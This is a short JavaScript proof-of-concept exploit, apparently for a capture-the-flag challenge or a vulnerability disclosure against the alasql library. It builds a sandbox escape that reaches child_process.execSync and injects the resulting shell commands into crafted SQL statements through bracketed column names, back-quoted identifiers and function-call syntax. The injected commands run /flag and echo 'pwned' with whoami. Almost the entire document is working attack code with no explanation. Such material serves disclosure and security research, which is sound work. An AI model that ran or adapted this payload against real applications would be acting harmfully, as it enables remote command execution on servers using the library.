const genPayload = command => 
  new Function(
    'return this.process.mainModule.require'
  )()('child_process').execSync(command).toString().trim();

alasql(
  'CREATE table i_am_a_table;' +
  'INSERT INTO i_am_a_table VALUES (1337);' +
  `UPDATE i_am_a_table SET [0'+${JSON.stringify(genPayload("/flag"))}+'] = '${genPayload("/flag")}';` +
  `SELECT * from i_am_a_table where whatever=['+${genPayload(">&2 echo SELECT pwned $(whoami)")}+'];` +
  `SELECT \`'+${genPayload(">&2 echo SELECT pwned again, back-quote works too. $(whoami)")}+'\` from i_am_a_table where 1;` +
  `SELECT [whatever||${genPayload('>&2 echo calling function pwned')}||]('whatever');`
);
